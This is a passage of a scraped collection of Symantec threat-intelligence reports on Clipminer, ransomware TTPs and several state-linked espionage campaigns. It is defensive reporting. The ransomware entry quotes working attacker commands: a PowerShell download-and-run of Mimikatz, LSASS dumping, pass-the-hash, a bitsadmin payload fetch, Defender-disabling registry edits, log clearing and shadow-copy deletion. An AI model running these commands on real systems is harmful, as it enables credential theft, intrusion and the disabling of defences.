rnd/dywqmjcdytwkxewrvtqznxgmpmdzyqgulzacxcxx\",\"algo\":[\"cn/1\",\"cn/2\",\"cn/r\",\"cn/fast\",\"cn/half\",\"cn/xao\",\"cn/rto\",\"cn/rwz\",\"cn/zls\",\"cn/double\",\"cn/ccx\",\"rx/0\",\"rx/wow\",\"rx/arq\",\"rx/sfx\",\"rx/keva\",\"argon2/chukwa\",\"argon2/chukwav2\",\"argon2/wrkz\"]}} Additionally, the malware monitors the clipboard for cryptocurrency addresses and replaces them with ones controlled by the attackers. Samples of the Clipminer malware began to appear around January 2021, with the cryptocurrency wallets used by the malware’s operators seeing activity begin in February of the same year. This is just a few months after KryptoCibule was uncovered and blogged about by ESET researchers. While we cannot confirm if Clipminer and KryptoCibule are one and the same, the design similarities are striking. It is possible that following the exposure from ESET’s blog, the KryptoCibule actors may have decided to switch things up and launched Clipminer. Another possibility is that different threat actors may have taken inspiration from KryptoCibule and created Clipminer in its image. However, whatever the truth may be, one thing is clear: Clipminer has proven a successful endeavor, earning its operators a considerable amount of money. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/clipminer-bitcoin-mining-hijacking"
  },
  {
    "title": "ransomware hive conti avoslocker",
    "content": "Targeted ransomware attacks continue to be one of the most critical cyber risks facing organizations of all sizes. The tactics used by ransomware attackers are continually evolving, but by identifying the most frequently employed tools, tactics, and procedures (TTPs) organizations can gain a deeper understanding into how ransomware groups infiltrate networks and use this knowledge to identify and prioritize areas of weakness. Symantec, a division ofBroadcom Software, tracks various ransomware threats; however, the following three ransomware families are being observed in the majority of recent attacks: Similar to many other ransomware families, Hive, Conti, and Avoslocker follow the ransomware-as-a-service (RaaS) business model. In the RaaS model the ransomware operators hire affiliates who are responsible for launching the ransomware attacks on their behalf. In most cases affiliates stick to a playbook that contains detailed attack steps laid out by the ransomware operators. Once initial access to a victim network has been gained, Hive, Conti, and Avoslocker use a plethora of TTPs to help the operators achieve the following: Affiliates for the Hive, Conti, and Avoslocker ransomware operators use a variety of techniques to gain an initial foothold on victim networks. Some of these techniques include: In most cases, the spear-phishing emails contain Microsoft Word document attachments embedded with macros that lead to the installation of one of the previously mentioned malware threats. In some instances, attackers use this malware to install Cobalt Strike, which is then used to pivot to other systems on the network. These malware threats are then used to distribute ransomware onto compromised computers. After gaining initial access, Symantec has observed affiliates for all three ransomware families using third-party software such as AnyDesk and ConnectWise Control (previously known as ScreenConnect) to maintain access to victim networks. They also enable default Remote Desktop access in the firewall: netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes Actors are also known to create additional users on compromised systems to maintain access. In some instances we have seen threat actors add registry entries that allow them to automatically log in when a machine is restarted: reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d <user> /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f During the discovery phase the ransomware actors try to sweep the victim’s network to identify potential targets. Symantec has observed the aforementioned ransomware actors using tools such as the following: Mimikatz is a go-to tool for most ransomware groups and Hive, Conti, and Avoslocker are no exception. We have observed them using the PowerShell version of Mimikatz as well as the PE version of the tool. There are also instances where the threat actors directly load the PowerShell version of Mimikatz from GitHub repositories: powershell IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1'));Invoke-Mimikatz -DumpCreds In addition to using Mimikatz, the threat actors have also taken advantage of the native rundll32 and comsvcs.dll combination to dump the LSASS memory: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <process id> lsass.dmp full Adversaries also dump the SECURITY, SYSTEM, and SAM hives and later extract credentials from the dump. In rare occasions they have also been observed using taskmgr.exe to dump the LSASS memory and later using the dump to extract valuable credentials. Attackers employ tools like PsExec, WMI, and BITSAdmin to laterally spread and execute the ransomware on victim networks. We have also observed the attackers using several other techniques to laterally move across networks. psexec -accepteula @ips.txt -s -d -c CSIDL_WINDOWS\\xxx.exe wmic /node:@C:\\share$\\comps1.txt /user:\"user\" /password:\"password\" process call create \"cmd.exe /c bitsadmin /transfer xxx \\\\IP\\share$\\xxx.exe %APPDATA%\\xxx.exe&%APPDATA%\\xxx.exe\" bitsadmin /transfer debjob /download /priority normal hxxp://<IP>/ele.dll CSIDL_WINDOWS\\ele.dll mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash>\" As with a number of other ransomware families, Hive, Conti, and Avoslocker also tamper with various security products that interfere with their goal. We have observed them meddling with security services using the net, taskkill, and sccommands to disable or terminate them. In some cases they also use tools like PC Hunterto end processes. They have also been seen tampering with various registry entries related to security products, since changes to the registry entries can make those products inoperative. Both Hive and AvosLocker have been observed attempting to disable Windows Defender using the following reg.exe commands. reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f reg.exe delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f reg.exe delete aHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run” /v “Windows Defender” /f reg.exe delete “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” /v “Windows Defender” / Disabling the default Windows firewall is also one of the techniques we have seen being used by these ransomware families: netsh advfirewall set allprofiles state off To cover their tracks on a victim system the actors may also clear the Windows event log: wevtutil.exe cl system wevtutil.exe cl security wevtutil.exe cl application powershell -command \"Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }\" Adversaries tend to disable or tamper with operating system settings in order to make it difficult for administrators to recover data. Deleting shadow copies is a common tactic threat actors perform before starting the encryption process. They perform this task by using tools like Vssadmin or WMIC and running one of the following commands: vssadmin.exe delete shadows /all /quiet wmic.exe shadowcopy delete We have also seen BCDEditbeing used to disable automatic system recovery and to ignore failures on boot: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit.exe /set {default} recoveryenabled no In some instances the actors delete the safe mode settings in the registry to stop security product services from starting in safe mode: reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\<service> /f Attackers commonly exfiltrate critical data from a victim’s environment before encrypting it. They then use the stolen data in an attempt to extort a ransom from victims. We have observed threat actors using the following cloud services to exfiltrate data: We have also seen attackers use the following tools for data exfiltration: The TTPs outlined in this blog are a snapshot of the current ransomware threat landscape. The TTPs used by these threat actors are constantly evolving, with groups continually tweaking their methods in a bid to outmaneuver their targets’ security defenses. As such, organizations need to be vigilant and employ a multi-layered security approach. Symantec Endpoint Protection (SEP) protects against ransomware attacks using multiple static and dynamic technologies. IPSblocksinitial access, persistence, and lateral movement. SEP's Audit Signatures are intended to raise awareness of potentially unwanted traffic on the network. By default, Audit Signatures do not block. Administrators reviewing the logs of IPS events in their network can note these Audit events and decide whether or not to configure the corresponding Audit Signatures to block the traffic. The following is a list of Audit Signatures that can be enabled to block, through policies, activity related to the use of software or tools such as AnyDesk, ScreenConnect, and PsExec. Symantec recommends that you have intrusion prevention enabled on all your devices including servers. Symantec Adaptive Protectioncan help protect against lateral movement and ransomware execution techniques used by an attacker. If you are not using tools like PsExec, WMIC, and BITSAdmin in your environment then you should “Deny” these applications and actions using Symantec Adaptive Protection policies. Karthikeyan is a member of Symantec’s Security Technology and Response team which is focused on providing round-the-clock protection against current and future cyber threats. Vishal is member of Symantec’s Security Technology and Response team where he is focused on researching future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/ransomware-hive-conti-avoslocker"
  },
  {
    "title": "stonefly north korea espionage",
    "content": "The North Korean-linked Stonefly group is continuing to mount espionage attacks against highly specialized engineering companies with a likely goal of obtaining sensitive intellectual property. Stonefly specializes in mounting highly selective targeted attacks against targets that could yield intelligence to assist strategically important sectors such as energy, aerospace, and military equipment. Virtually all of the technologies it appears to be interested in have military as well as civilian uses and some could have applications in the development of advanced weaponry. Stonefly (aka DarkSeoul, BlackMine, Operation Troy, and Silent Chollima) first came to notice in July 2009, when it mounted distributed denial-of-service (DDoS) attacks against a number of South Korean, U.S. government, and financial websites. It reappeared again in 2011, when it launched more DDoS attacks, but also revealed an espionage element to its attacks when it was found to be using a sophisticated backdoor Trojan (Backdoor.Prioxer) against selected targets. In March 2013, the group was linked to the Jokra (Tojan.Jokra) disk-wiping attacks against a number of South Korean banks and broadcasters. Three months later, the group was involved in a string ofDDoS attacks against South Korean government websites. In recent years, the group’s capabilities have grown markedly and, since at least 2019 Symantec has seen its focus shift solely to espionage operations against select, high-value targets. It now appears to specialize in targeting organizations that hold classified or highly sensitive information or intellectual property. Stonefly’s operations appear to be part of a broader North Korean-sponsored campaign to acquire information and intellectual property, with Operation Dream Job, a more wider-ranging trawl across multiple sectors, being carried out by another North Korean group, Pompilus. The most recent attack discovered by Symantec, a division ofBroadcom Software, was against an engineering firm that works in the energy and military sectors. The attackers breached the organization in February 2022, most likely by exploiting theLog4j vulnerability(CVE-2021-44228) vulnerability on a public-facing VMware View server. The attackers then moved across the network and compromised 18 other computers. 17 hours later:Shortly after compromising the initial server, the attackers installed an updated version of Stonefly’s Backdoor.Preft malware (aka Dtrack, Valefor). The attackers then used a masqueraded version (file name: pvhost.exe) ofPuTTY’s PSCP command line application, presumably to exfiltrate data from the infected machine. Shortly after PSCP was executed, the credential-dumping tool Mimikatz (masquerading under the file name pl.exe) was run. Day 2: Malicious activity resumed when3proxy tiny proxy server, a publicly available proxy tool (file name: svhost.exe) was executed. Use of this tool continued for the next four days. A second suspected proxy tool was installed two days into this four day period (file name: tapi.exe). Several hours afterwards, a copy of the Preft backdoor (file name: svchost.exe) was installed. Two days later,WinSCP, an open-source SSH file-transfer tool was used, presumably to exfiltrate or upload data to the compromised computer. Day 3:The next phase of the intrusion began on the following day, when Preft was executed and the attackers began moving latterly across the organization’s network, usingInvoke-TheHash, a publicly available PowerShell pass-the-hash utility (file name: rev.ps1), and wmiexec.py,a publicly available Impacket toolused to run WMI commands (file name: notepad.exe). The attackers used an updated version of Stonefly’s custom Preft backdoor. Analysis of the backdoor revealed that it is a multistage tool: Stage 1 is the main binary. A python script is used to unpack the binary and shellcode. Stage 2 is shellcode. It performs the following actions: Stage 3 is more shellcode. Stage 4 is the payload. It is an HTTP remote access tool (RAT) that supports various commands, including: The malware can support four different kinds of plugins: executable files, VBS, BAT, and shellcode. It supports three different persistence modes: Startup_LNK, Service, Registry, and Task Scheduler. Along with the Preft backdoor, Stonefly also deployed what appears to be a custom developed information stealer (infostealer). Analysis of this malware revealed that it is a three-staged threat. The main binary extracts and decrypts the encrypted shellcode with a modified RC4 algorithm. Stage 2 is shellcode which retrieves the payload and decrypts it with the same modified RC4 algorithm. The decrypted payload is an executable file that is loaded in-memory. It is designed to search the infected computer for files using pre-configured parameters. These are then copied to temporary files before being copied to a single .zip file and the temporary files are removed. The ZIP file path is %TEMP/~[XXXXXXXX].tmp, where XXXXXXXX is a simple hash of the computer name (eight uppercase hex digits). Curiously, this ZIP file is not automatically exfiltrated. It is possible that the exfiltration functionality was removed and the attackers planned to use an alternative means of exfiltration. While Stonefly’s tools and tactics continue to evolve, there are some common threads between this recent activity and previous attacks, such as its ongoing development of the Preft backdoor and heavy reliance on open-source tools. The group’s capabilities and its narrow focus on acquiring sensitive information make it one of the most potent North Korean cyber threat actors operating today. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/stonefly-north-korea-espionage"
  },
  {
    "title": "shuckworm intense campaign ukraine",
    "content": "The Russian-linked Shuckworm espionage group (aka Gamaredon, Armageddon) is continuing to mount an intense cyber campaign against organizations in Ukraine. Shuckworm has almost exclusively focused its operations on Ukraine since it first appeared in 2014. These attacks have continued unabated since the Russian invasion of the country. While the group’s tools and tactics are simple and sometimes crude, the frequency and persistence of its attacks mean that it remains one of the key cyber threats facing organizations in the region. One of the hallmarks of the group’s recent activity is the deployment of multiple malware payloads on targeted computers. These payloads are usually different variants of the same malware (Backdoor.Pterodo), designed to perform similar tasks. Each will communicate with a different command-and-control (C&C) server. The most likely reason for using multiple variants is that it may provide a rudimentary way of maintaining persistence on an infected computer. If one payload or C&C server is detected and blocked, the attackers can fall back on one of the others and roll out more new variants to compensate. Symantec’s Threat Hunter Team, part ofBroadcom Software, has found four distinct variants of Pterodo being used in recent attacks. All of them are Visual Basic Script (VBS) droppers with similar functionality. They will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain persistence, and download additional code from a C&C server. All of the embedded VBScripts were very similar to one another and used similar obfuscation techniques. This variant is a modified self-extracting archive, containing obfuscated VBScripts in resources that can be unpacked by 7-Zip. It then adds them as a scheduled task to ensure persistence: The script also copies itself to [USERPROFILE]\\ntusers.ini file. The two newly created files are more obfuscated VBScripts. This variant is also designed to drop VBScripts on the infected computer. When run, it will first engage in API hammering, making multiple meaningless API calls, which is presumably an attempt to avoid sandbox detection. It will then unpack a script and a file called offspring.gif to C:\\Users\\[username]\\. It will call the script with: This script runs ipconfig /flushdns and executes the offspring.gif file. Offsprint.gif will download a PowerShell script from a random subdomain of corolain.ru and execute it: This variant is another VBScript dropper. It will create two files: It executes them with the following command: Similar to the other variants, the first script will run ipconfig /flushdns before calling the second script and removing the original executable. The second script has two layers of obfuscation, but in the end it downloads the final payload from the domain declined.delivered.maizuko[.]ru and executes it. The final variant is functionally very similar to variants B and C, engaging in API hammering before extracting two VBScript files to the user’s home directory. Script obfuscation is very similar to other variants. While the attackers have made heavy use of Pterodo during recent weeks, other tools have also been deployed alongside it. These include UltraVNC, an open-source remote-administration/remote-desktop-software utility. UltraVNC has previously been used by Shuckworm in multiple attacks. In addition to this, Shuckworm has also been observed using Process Explorer, a Microsoft Sysinternals tool designed to provide information about which handles and DLL processes have opened or loaded. While Shuckworm is not the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations. It appears that Pterodo is being continuously redeveloped by the attackers in a bid to stay ahead of detection. While Shuckworm appears to be largely focused on intelligence gathering, its attacks could also potentially be a precursor to more serious intrusions, if the access it acquires to Ukrainian organizations is turned over to other Russian-sponsored actors. For the latest protection updates, please visit theSymantec Protection Bulletin. A full list of IOCs isavailable here on GitHub. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/shuckworm-intense-campaign-ukraine"
  },
  {
    "title": "lazarus dream job chemical",
    "content": "Symantec, a division ofBroadcom Software, has observed the North Korea-linked advanced persistent threat (APT) group known as Lazarus conducting an espionage campaign targeting organizations operating within the chemical sector. The campaign appears to be a continuation of Lazarus activity dubbed Operation Dream Job, which was first observed in August 2020. Symantec tracks this sub-set of Lazarus activity under the name Pompilus. Operation Dream Job involves Lazarus using fake job offers as a means of luring victims into clicking on malicious links or opening malicious attachments that eventually lead to the installation of malware used for espionage. Past Dream Job campaigns have targeted individuals in the defense, government, and engineering sectors in activity observed inAugust 2020andJuly 2021. In January 2022, Symantec detected attack activity on the networks of a number of organizations based in South Korea. The organizations were mainly in the chemical sector, with some being in the information technology (IT) sector. However, it is likely the IT targets were used as a means to gain access to chemical sector organizations. There is sufficient evidence to suggest that this recent activity is a continuation of Operation Dream Job. That evidence includes file hashes, file names, and tools that were observed in previous Dream Job campaigns. A typical attack begins when a malicious HTM file is received, likely as a malicious link in an email or downloaded from the web. The HTM file is copied to a DLL file called scskapplink.dll and injected into the legitimate system management software INISAFE Web EX Client. The scskapplink.dll file is typically a signed Trojanized tool with malicious exports added. The attackers have been observed using the following signatures: DOCTER USA, INC and \"A\" MEDICAL OFFICE, PLLC Next, scskapplink.dll downloads and executes an additional payload from a command-and-control (C&C) server with the URL parameter key/values \"prd_fld=racket\". This step kicks off a chain of shellcode loaders that download and execute arbitrary commands from the attackers, as well as additional malware, which are usually executed from malicious exports added to Trojanized tools such as the Tukaani project LZMA Utils library (XZ Utils). The attackers move laterally on the network using Windows Management Instrumentation (WMI) and inject into MagicLine by DreamSecurity on other machines. In some instances, the attackers were spotted dumping credentials from the registry, installing a BAT file in a likely effort to gain persistence, and using a scheduled task configured to run as a specific user. The attackers were also observed deploying post-compromise tools, including a tool used to take screenshots of web pages viewed on the compromised machine at set intervals (SiteShoter). They were also seen using an IP logging tool (IP Logger), a protocol used to turn computers on remotely (WakeOnLAN), a file and directory copier (FastCopy), and the File Transfer Protocol (FTP) executed under the MagicLine process. The following is a case study detailing step-by-step attacker activity on an organization in the chemical sector. 00:51 –A malicious HTM file is received: The HTM file is copied to a DLL file: This DLL file is injected into the legitimate system management software INISAFE Web EX Client. The file is a signed Trojanized version of the ComparePlus plugin for Notepad++ with malicious exports added. 01:02 –The file is run and downloads and executes a backdoor payload (final.cpl - 5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db) from a command-and-control (C&C) server with the URL parameter key/values \"prd_fld=racket\". The file final.cpl is a Trojanized version of the Tukaani project LZMA Utils library (XZ Utils) with a malicious export added (AppMgmt). The malware connects to, downloads, decodes, and executes shellcode from the following remote location: 01:04 –Another CPL file (61e305d6325b1ffb6de329f1eb5b3a6bcafa26c856861a8200d717df0dec48c4) is executed. This file, again, is a Trojanized version of LZMA Utils with a malicious added export. 01:13 –The shellcode loader (final.cpl) is executed again several times. 01:38 –Commands are executed to dump credentials from the SAM and SYSTEM registry hives. Over the next several hours, the attackers run unknown shellcode via final.cpl at various intervals, likely to collect the dumped system hives, among other things. 06:41 –The attackers create a scheduled task to ensure persistence between system reboots: The scheduled task instructs the system to execute 'Intel.bat' as user ‘[REDACTED].help/175287’ starting at 15:42 then every minute under the scheduled task name ‘arm’. It's unclear if this was an account that was cracked via the dumped registry hives or an account the attackers were able to create with admin rights. The attackers were also observed installing Cryptodome (PyCrypto fork) Python encryption modules via CPL files. A clean installation of BitDefender was also installed by the attackers. While unconfirmed, the threat actors may have installed an older version of this software (from 2020) with avulnerability that allowed attackers to run arbitrary commands remotely. 00:21 –The final.cpl file is executed again. 00:49 –A new CPL file called wpm.cpl (942489ce7dce87f7888322a0e56b5e3c3b0130e11f57b3879fbefc48351a78f6) is executed. This file contains, and connects to, a list of IP addresses and records whether the connections were successful. 01:11 –Again, the final.cpl shellcode loader is executed multiple times, executing some unknown shellcode. This activity continued intermittently until 23:49. 23:49 –The file name of the CPL file changes to 'ntuser.dat'. The file location and command-line arguments remain the same. 00:24 –The CPL shellcode loader files (final.cpl and ntuser.dat) are executed multiple times. 00:28 –The attackers create a scheduled task on another machine, likely to ensure persistence: The command is used to schedule a task named 'arm' to run the file 'arm.bat' starting at at 09:28 then every minute after that under the user account '[REDACTED]\\i21076'. 00:29 –A file named arm.dat (48f3ead8477f3ef16da6b74dadc89661a231c82b96f3574c6b7ceb9c03468291) is executed with the following command line arguments: The arm.dat file is a tool used to take screenshots of web pages viewed on the compromised machine every 10 seconds (SiteShoter), as determined by the command line arguments. The screenshots are saved in appdata\\local with the date at the top of the file. 06:50 –The shellcode loader (final.cpl) is executed several times. 07:34 –A new CPL file named addins.cpl (5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db) is executed multiple times, which again is another shellcode loader and has the same command line arguments as seen with final.cpl: 07:39 –A scheduled task is created: The task is used to auto-start and execute addins.bat each time the system is booted. The task uses the service name 'uso' (a file name previously used in older Dream Job campaigns targeting security researchers). The attacker runs addins.cpl again to run a command to start the service and then delete the service directly after: The following commands were then executed to collect information pertaining to network configuration, current user the attackers are logged in as, active users on the machine, available shared drives, and the contents of the 'addins' directory. 07:41 –The file addins.cpl is executed again multiple times before a scheduled task is created to run addins.bat again, start the service, and immediately delete the service: The attackers execute addins.cpl again with the same command line as before. No further activity is observed. The Lazarus group is likely targeting organizations in the chemical sector to obtain intellectual property to further North Korea’s own pursuits in this area. The group’s continuation of Operation Dream Job, as witnessed by Symantecand others, suggests that the operation is sufficiently successful. As such, organizations should ensure they have adequate security in place and remain vigilant for attacks such as this. As always, users should be wary of clicking links or downloading files even if they come from seemingly trustworthy sources. For the latest protection updates, please visit theSymantec Protection Bulletin. 164f6a8f7d2035ea47514ea84294348e32c90d817724b80ad9cd3af6f93d83f8 18686d04f22d3b593dd78078c9db0ac70f66c7138789ad38469ec13162b14cef 1cb8ea3e959dee988272904dbb134dad93539f2c07f08e1d6e10e75a019b9976 2dd29b36664b28803819054a59934f7a358a762068b18c744281e1589af00f1f 32bfdf1744077c9365a811d66a6ea152831a60a4f94e671a83228016fc87615f 35de8163c433e8d9bf6a0097a506e3abbb8308330d3c5d1dea6db71e1d225fc3 4277fcaada4939b76a3df4515b7f74837bf8c4b75d4ff00f8d464169eede01e3 4446efafb4b757f7fc20485198236bed787c67ceffc05f70cd798612424384ce 48f3ead8477f3ef16da6b74dadc89661a231c82b96f3574c6b7ceb9c03468291 4a2236596e92fa704d8550c56598855121430f96fe088712b043cba516f1c76c 54029bd4fcc24551564942561a60b906bee136264f24f43775b7a8e15095a9e0 56da872e8b0f145417defd4a37f357b2f73f244836ee30ac27af7591cda2d283 5e7edc8f1c652f53a6d2eabfbd9252781598de91dbe59b7a74706f69eb52b287 5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db 61e305d6325b1ffb6de329f1eb5b3a6bcafa26c856861a8200d717df0dec48c4 67f1db122ad8f01e5faa60e2facf16c0752f6ab24b922f218efce19b0afaf607 7491f298e27eb7ce7ebbf8821527667a88eecd5f3bc5b38cd5611f7ebefde21e 79b7964bde948b70a7c3869d34fe5d5205e6259d77d9ac7451727d68a751aa7d 7aa62af5a55022fd89b3f0c025ea508128a03aab5bc7f92787b30a3e9bc5c6e4 8769912b9769b4c11aabc523a699d029917851822d4bc1cb6cc65b0c27d2b135 8aace6989484b88abc7e3ec6f70b60d4554bf8ee0f1ccad15db84ad04c953c2d 942489ce7dce87f7888322a0e56b5e3c3b0130e11f57b3879fbefc48351a78f6 a881c9f40c1a5be3919cafb2ebe2bb5b19e29f0f7b28186ee1f4b554d692e776 bdb76c8d0afcd6b57c8f1fa644765b95375af2c3a844c286db7f60cf9ca1a22a d815fb8febaf113f3cec82f552dfec1f205071a0492f7e6a2657fa6b069648c6 e1997d1c3d84c29e02b1b7b726a0d0f889a044d7cd339f4fb88194c2c0c6606d e31af5131a095fbc884c56068e19b0c98636d95f93c257a0c829ec3f3cc8e4ba ef987baef9a1619454b14e1fec64283808d4e0ce16fb87d06049bfcf9cf56af3 f29d386bdf77142cf2436797fba1f8b05fab5597218c2b77f57e46b8400eb9de f7359490d6c141ef7a9ee2c03dbbd6ce3069e926d83439e1f8a3dfb3a7c3dc94 f8995634b102179a5d3356c6f353cb3a42283d9822e157502486262a3af4447e ff167e09b3b7ad6ed1dead9ee5b4747dd308699a00905e86162d1ec1b61e0476 [URL]/[FOLDER]/[FILENAME]asp?prd_fld=racket happy.nanoace[.]co.kr hxxp://happy.nanoace[.]co.kr/Content/rating/themes/krajee-fas/FrmAMEISMngWeb.asp hxxps://mariamchurch[.]com/board/news/index.asp hxxps://www.aumentarelevisite[.]com/img/context/offline.php www.aumentarelevisite[.]com www.ric-camid[.]re.kr The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "link": "https://www.security.com/threat-intelligence/lazarus-dream-job-chemical"
  },
  {
    "title": "cicada apt10 china ngo government attacks",
    "content": "A Chinese state-backed advanced persistent threat (APT) group is attacking organizations around the globe in a likely espionage campaign that has been ongoing for several months. Victims in this Cicada (aka APT10) campaign include government, legal, religious, and non-governmental organizations (NGOs) in multiple countries around the world, including in Europe, Asia, and North America. The wide number of sectors and geographies of the organizations targeted in this campaign is interesting. Cicada’s initial activity several years ago was heavily focused on Japanese-linked companies, though in more recent times it has been linked to attacks on managed service providers (MSPs) with a more global footprint. However, this campaign does appear to indicate a further widening of Cicada’s targeting. The attribution of this activity to Cicada is based on the presence on victim networks of a custom loader and custom malware that are believed to be exclusively used by the APT group. While Cicada has been linked to espionage-style operations dating back to 2009, the earliest activity in this current campaign occurred in mid-2021, with the most recent activity seen in February 2022, so this is a long-running attack campaign that may still be ongoing, researchers from Symantec, a division ofBroadcom, have found. In several cases, the initial activity on victim networks is seen on Microsoft Exchange Servers, suggesting the possibility that a known, unpatched vulnerability in Microsoft Exchange may have been used to gain access to victim networks in some cases. Once the attackers have successfully gained access to victim machines we observe them deploying various different tools, including a custom loader and the Sodamaster backdoor. The loader deployed in this campaign was also deployed in a previous Cicada attack. Sodamaster is a known Cicada tool that is believed to be exclusively used by this group. It is a fileless malware that is capable of multiple functions, including evading detection in a sandbox by checking for a registry key or delaying execution; enumerating the username, hostname, and operating system of targeted systems; searching for running processes, and downloading and executing additional payloads. It is also capable of obfuscating and encrypting traffic that it sends back to its command-and-control (C&C) server. It is a powerful backdoor that Cicada has been using since at least 2020. In this campaign, the attackers are also seen dumping credentials, including by using a custom Mimikatz loader. This version of Mimikatz drops mimilib.dll to obtain credentials in plain text for any user that is accessing the compromised host and provides persistence across reboots. The attackers also exploit the legitimate VLC Media Player by launching a custom loader via the VLC Exports function, and use the WinVNC tool for remote control of victim machines. Other tools utilized in this attack campaign include: The victims in this campaign appear to primarily be government-related institutions or NGOs, with some of these NGOs working in the fields of education and religion. There were also victims in the telecoms, legal, and pharmaceutical sectors. The victims are spread through a wide number of regions including the U.S., Canada, Hong Kong, Turkey, Israel, India, Montenegro, and Italy. There is also just one victim in Japan, which is notable due to Cicada’s previous strong focus on Japanese-linked companies. The attackers spent as long as nine months on the networks of some victims. The victims targeted, the various tools deployed in this campaign, and what we know of Cicada’s past activity all indicate that the most likely goal of this campaign is espionage. Cicada activity waslinked by U.S. government officials to the Chinese governmentin 2018. This is a long-running campaign from a sophisticated and experienced nation-state-backed actor that may still be ongoing, as the most recent activity we saw in this campaign was in February 2022. The targeting of multiple large organizations in different geographies at the same time would require a lot of resources and skills that are generally only seen in nation-state backed groups, and shows that Cicada still has a lot of firepower behind it when it comes to its cyber activities. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 01b610e8ffcb8fd85f2d682b8a364cad2033c8104014df83988bc3ddfac8e6ec 056c0628be2435f2b2031b3287726eac38c94d1e7f7aa986969baa09468043b1 062ce400f522f90909ed5c4783c5e9c60b63c09272e2ddde3d13e748a528fa88 0b452f7051a74a1d4a544c0004b121635c15f80122dc6be54db660ceb2264d6f 0ec48b297dd1b0d6c3ddd15ab63f405191d7a849049feedfa7e44096c6f9d42a 20fc3cf1afcad9e6f19e9abebfc9daf374909801d874c3d276b913f12d6230ec 